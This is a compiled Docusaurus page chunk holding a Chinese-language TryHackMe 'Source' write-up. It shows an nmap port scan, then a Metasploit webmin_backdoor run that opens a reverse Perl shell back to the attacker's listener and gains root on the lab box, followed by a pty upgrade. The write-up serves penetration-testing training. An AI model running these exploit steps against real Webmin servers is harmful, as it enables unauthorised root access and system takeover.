"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3808],{69482:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>a,toc:()=>l});var o=t(74848),r=t(28453);const s={sidebar_position:27,tags:["Easy","Linux","CVE"],title:"Source",description:"Source",sidebar_label:"Source",slug:"/tryhackme/27"},i="Source",a={id:"box/TryHackMe/27",title:"Source",description:"Source",source:"@site/docs/box/TryHackMe/27.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/27",permalink:"/docs/tryhackme/27",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"CVE",permalink:"/docs/tags/cve"}],version:"current",sidebarPosition:27,frontMatter:{sidebar_position:27,tags:["Easy","Linux","CVE"],title:"Source",description:"Source",sidebar_label:"Source",slug:"/tryhackme/27"},sidebar:"boxSidebar",previous:{title:"Chocolate Factory",permalink:"/docs/tryhackme/26"},next:{title:"Easy Peasy",permalink:"/docs/tryhackme/28"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"1000",id:"1000",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"root",id:"root",level:3}];function u(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"source",children:"Source"}),"\n",(0,o.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-153-252:~# nmap -sT -p- --min-rate 1000 10.10.126.232\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-21 12:20 BST\nNmap scan report for ip-10-10-126-232.eu-west-1.compute.internal (10.10.126.232)\nHost is up (0.0017s latency).\nNot shown: 65533 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n10000/tcp open  snet-sensor-mgmt\nMAC Address: 02:7C:DD:08:0A:65 (Unknown)\n"})}),"\n",(0,o.jsx)(n.h2,{id:"1000",children:"1000"}),"\n",(0,o.jsx)(n.p,{children:"\u8bbf\u95ee\u6b64\u7ad9\u70b9\u53d1\u73b0\u662f\u4e00\u4e2a webmin \u7ad9\u70b9, \u540c\u65f6\u6ca1\u6709\u7ed9\u51fa\u4efb\u4f55\u53ef\u5229\u7528\u7684\u5730\u65b9, \u67e5\u627e webmin \u6f0f\u6d1e \u53d1\u73b0"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601180115.png",alt:"20240601180115"})}),"\n",(0,o.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(n.h3,{id:"root",children:"root"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'msf6 exploit(linux/http/webmin_backdoor) > set Lhost 10.10.153.252\nLhost => 10.10.153.252\nmsf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.126.232\nRHOSTS => 10.10.126.232\nmsf6 exploit(linux/http/webmin_backdoor) > set SSl true\n[!] Changing the SSL option\'s value may require changing RPORT!\nSSl => true\nmsf6 exploit(linux/http/webmin_backdoor) > run\n\n[*] Started reverse TCP handler on 10.10.153.252:4444 \n[*] Running automatic check ("set AutoCheck false" to disable)\n[+] The target is vulnerable.\n[*] Configuring Automatic (Unix In-Memory) target\n[*] Sending cmd/unix/reverse_perl command payload\n[*] Command shell session 1 opened (10.10.153.252:4444 -> 10.10.126.232:43782) at 2023-08-21 12:49:26 +0100\n\nid\nuid=0(root) gid=0(root) groups=0(root)\necho "import pty; pty.spawn(\'/bin/bash\')" > /tmp/anyname.py\npython /tmp/anyname.py\nroot@source:/usr/share/webmin/#\n'})})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(u,{...e})}):u(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var o=t(96540);const r={},s=o.createContext(r);function i(e){const n=o.useContext(s);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),o.createElement(s.Provider,{value:n},e.children)}}}]);